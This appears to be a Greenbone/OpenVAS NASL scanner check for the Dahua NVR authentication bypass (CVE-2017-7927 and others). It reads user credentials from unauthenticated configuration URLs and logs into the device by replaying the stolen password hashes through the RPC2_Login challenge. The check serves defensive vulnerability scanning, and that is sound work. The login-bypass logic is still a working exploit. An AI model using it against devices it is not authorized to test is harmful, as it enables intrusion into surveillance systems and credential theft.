CPE = "cpe:/a:dahua:nvr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140185" );
	script_version( "2021-09-15T12:01:38+0000" );
	script_cve_id( "CVE-2017-6343", "CVE-2017-7253", "CVE-2017-7927", "CVE-2017-7925", "CVE-2017-6432", "CVE-2017-6341", "CVE-2017-6342" );
	script_bugtraq_id( 96449, 96454, 96456, 98312, 98312, 97263 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Dahua Devices Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.dahuasecurity.com/en/us/uploads/Dahua%20Technology%20Vulnerability%20030617v2.pdf" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2017/Mar/7" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/96449" );
	script_xref( name: "URL", value: "https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to bypass authentication mechanism and perform unauthorized
  actions. This may lead to further attacks." );
	script_tag( name: "vuldetect", value: "Try to login into the remote device." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The remote Dahua device is prone to an authentication-bypass vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-09-15 12:01:38 +0000 (Wed, 15 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_tag( name: "creation_date", value: "2017-03-14 14:30:19 +0100 (Tue, 14 Mar 2017)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "gb_dahua_devices_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "dahua/device/detected" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
func do_login( generation, buf, port ){
	var generation, buf, port;
	if(!generation || !buf){
		return;
	}
	if( generation == "GEN3" ) {
		return do_gen_3_login( buf: buf, port: port );
	}
	else {
		return do_gen_2_login( buf: buf, port: port );
	}
}
func do_gen_3_login( buf, port ){
	var buf, port;
	var lines, i, pw_hash, pass, pdata, id, r, random, user, lpass, a, s, session, AL, alen;
	if(!buf){
		return;
	}
	lines = split( buffer: buf, sep: "\"Users\" : [", keep: FALSE );
	if(isnull( lines[1] )){
		return;
	}
	lines = split( lines[1] );
	for(i = 0;i < max_index( lines );i++){
		user = "";
		pw_hash = "";
		AL = FALSE;
		alen = 0;
		if(ContainsString( lines[i], "\"Name\" :" ) && ContainsString( lines[i + 1], "Password" )){
			u = eregmatch( pattern: "\"Name\"\\s*:\\s*\"([^\"]+)\"", string: lines[i] );
			if(isnull( u[1] )){
				continue;
			}
			user = u[1];
			pass = eregmatch( pattern: "\"Password\"\\s*:\\s* \"([^\"]+)\"", string: lines[i + 1] );
			if(isnull( pass[1] )){
				continue;
			}
			pw_hash = pass[1];
		}
		if(!pw_hash){
			continue;
		}
		id = "1" + rand_str( length: 4, charset: "1234567890" );
		pdata = "{\"params\": {\"userName\": \"" + user + "\", \"password\": \"\", \"clientType\": \"Web3.0\"}, \"method\": \"global.login\", \"id\": " + id + "}";
		req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
		recv = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!ContainsString( recv, "random" ) || !ContainsString( recv, id ) || !ContainsString( recv, "session" )){
			continue;
		}
		r = eregmatch( pattern: "\"random\"\\s*:\\s*\"([^\"]+)\"", string: recv );
		if(isnull( r[1] )){
			continue;
		}
		random = r[1];
		s = eregmatch( pattern: "\"session\"\\s*:\\s*([0-9]+)", string: recv );
		if(isnull( s[1] )){
			continue;
		}
		session = s[1];
		lpass = "" + user + ":" + random + ":" + pw_hash;
		random_hash = toupper( hexstr( MD5( lpass ) ) );
		pdata = "{\"session\": " + session + ", \"params\": {\"userName\": \"" + user + "\", \"authorityType\": \"Default\", \"password\": \"" + random_hash + "\", \"clientType\": \"Web3.0\"}, \"method\": \"global.login\", \"id\": " + id + "}";
		req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Dhwebclientsessionid", session, "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
		recv = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(IsMatchRegexp( recv, "HTTP/1\\.. 200" ) && IsMatchRegexp( recv, "\"result\"\\s*:\\s*true" ) && !ContainsString( recv, "Component error" )){
			pdata = "{\"session\": " + session + ", \"params\": \"null\", \"method\": \"global.logout\", \"id\": " + id + "}";
			req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
			recv = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			return user;
		}
	}
	return;
}
func do_gen_2_login( buf, port ){
	var buf, port;
	var user, pass, lines, line, ld, id, pdata, req, recv, s, session;
	if(!buf){
		return;
	}
	lines = split( buf );
	for line in lines {
		if(IsMatchRegexp( line, "^#" ) || strlen( line ) < 4){
			continue;
		}
		user = FALSE;
		pass = FALSE;
		ld = split( buffer: line, sep: ":", keep: FALSE );
		if(max_index( ld ) < 6){
			continue;
		}
		user = ld[1];
		pass = ld[2];
		if(!user || !pass){
			continue;
		}
		id = "1" + rand_str( charset: "1234567890", length: 4 );
		pdata = "{\"params\": {\"userName\": \"" + user + "\", \"password\": \"\", \"clientType\": \"Web3.0\"}, \"method\": \"global.login\", \"id\": " + id + "}";
		req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
		recv = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		s = eregmatch( pattern: "\"session\"\\s*:\\s*([0-9]+)", string: recv );
		if(isnull( s[1] )){
			continue;
		}
		session = s[1];
		pdata = "{\"session\": " + session + ", \"params\": {\"userName\": \"" + user + "\", \"authorityType\": \"OldDigest\", \"password\": \"" + pass + "\", \"clientType\": \"Web3.0\"}, \"method\": \"global.login\", \"id\": " + id + "}";
		req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Dhwebclientsessionid", session, "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
		recv = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(IsMatchRegexp( recv, "HTTP/1\\.. 200" ) && IsMatchRegexp( recv, "\"result\"\\s*:\\s*true" ) && !ContainsString( recv, "Component error" )){
			pdata = "{\"session\": " + session + ", \"params\": \"null\", \"method\": \"global.logout\", \"id\": " + id + "}";
			req = http_post_put_req( port: port, url: "/RPC2_Login", data: pdata, add_headers: make_array( "X-Request", "JSON", "X-Requested-With", "XMLHttpRequest", "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8" ) );
			recv = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			return user;
		}
	}
	return;
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
urls = make_array();
urls["/current_config/Account1"] = make_list( "GEN3",
	 "\"DevInformation\" : \\{" );
urls["/current_config/passwd"] = make_list( "GEN2",
	 "id:name:passwd:groupid:" );
for url in keys( urls ) {
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( buf, "HTTP/1\\.. 200" )){
		continue;
	}
	pattern = "";
	generation = "";
	d = urls[url];
	pattern = d[1];
	generation = d[0];
	if(eregmatch( pattern: pattern, string: buf )){
		if(user = do_login( generation: generation, buf: buf, port: port )){
			report = "It was possible to read user and password from `" + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "` and to login\ninto the remote Dahua device as user `" + user + "`.\n";
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

